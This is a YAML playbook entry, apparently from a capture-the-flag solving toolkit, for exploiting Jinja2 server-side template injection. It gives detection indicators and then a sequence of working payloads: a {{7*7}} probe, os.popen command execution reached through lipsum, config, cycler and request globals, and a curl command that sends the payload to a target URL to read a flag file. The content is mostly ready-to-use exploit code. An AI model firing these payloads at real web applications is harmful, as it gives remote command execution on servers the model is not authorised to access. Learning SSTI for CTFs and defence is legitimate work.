name: jinja2_ssti_rce
category: web
tags: [ssti, jinja2, rce, template_injection]
indicators:
  - "User input in template rendering"
  - "Jinja2 template engine"
  - "String concatenation in template"
  - "from_string() method usage"

tricks:
  - name: "Step 1: Detect SSTI"
    when: "Found potential template injection point"
    how: "Test with simple expression"
    payload: |
      {{7*7}}
      # If returns "49", SSTI confirmed
      # Input: ?username={{7*7}}
      # Output: Welcome 49!

  - name: "Step 2: Use lipsum for RCE"
    when: "SSTI confirmed in Jinja2"
    how: "Access os module via lipsum globals"
    payload: |
      {{lipsum.__globals__['os'].popen('cat flag.txt').read()}}
      # lipsum is a built-in Jinja2 function
      # Access __globals__ to get os module
      # Execute command with popen()

  - name: "Step 3: Get flag"
    when: "Execute attack"
    how: "Send payload via username parameter"
    payload: |
      curl --get "http://TARGET/" \
        --data-urlencode "username={{lipsum.__globals__['os'].popen('cat flag.txt').read()}}"
      # Response: Welcome flag{...}!

  - name: "Alternative payloads"
    when: "Need variations"
    how: "Other Jinja2 RCE techniques"
    payload: |
      # Using config
      {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
      
      # Using cycler
      {{cycler.__init__.__globals__.os.popen('id').read()}}
      
      # Using request (if available)
      {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

